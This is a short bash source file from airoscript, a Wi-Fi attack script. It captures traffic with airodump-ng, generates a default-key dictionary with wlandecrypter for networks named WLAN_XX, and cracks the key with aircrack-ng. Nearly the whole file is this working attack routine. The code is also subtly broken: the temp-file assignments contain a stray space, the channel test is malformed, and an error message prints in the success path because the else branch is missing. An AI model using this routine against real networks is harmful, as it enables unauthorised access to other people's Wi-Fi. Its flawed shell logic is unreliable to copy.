#!/bin/bash
# Unstable functions file for airoscript.
# Requires: wlandecrypter 
# By David Francos (XayOn) <yo.orco@gmail.com>
echo -e "\tUnstable functions from airoscript loaded,\n\tif you don't want this, set UNSTABLE=0 in\n\tconfig file"
function doitwld {
	airodump-ng -w $CAPFILE  $OPT $CHANNEL $WIFI
	clear 
	wlandecrypter $Host_MAC $Host_SSID $DICFILE 
	aircrack-ng -b $Host_MAC -w $DICFILE $CAPFILE 
}

function wld {
# Here goes, if no host_mac is present, ask for it. Hope it's OK.	
	if [ $Host_MAC ] 
	then

		CAPFILE= `mktemp -p $DUMP_PATH`
		DICFILE= `mktemp -p $DUMP_PATH`
			echo  "######################################"
			echo  "##Do you want to specify a channel? ##"
			echo  "##If so, enter the channel, if not, ##"
			echo  "##leave it empty and press enter.   ##"
			echo  "######################################"

			read CHANNEL
				if [ $CHANNEL -ne "" ]
				then
					OPT="--channel "
				fi

			echo -e "I'm going to launch airodump now, when you\n get sufficent (3-6) iv's, stop it" 

			sleep 2 
			case $Host_SSID in
				WLAN_[1-9][1-9] )
					echo "Your wifi is the form WLAN_XX so I'll try it"
					doitwld
					;;
				*)
					echo "Sorry, your selected wlan is not supported"
					;;
			esac
				

		clear
		echo -e "Error: You must select a client before performing this attack.\n"
	fi
	
}
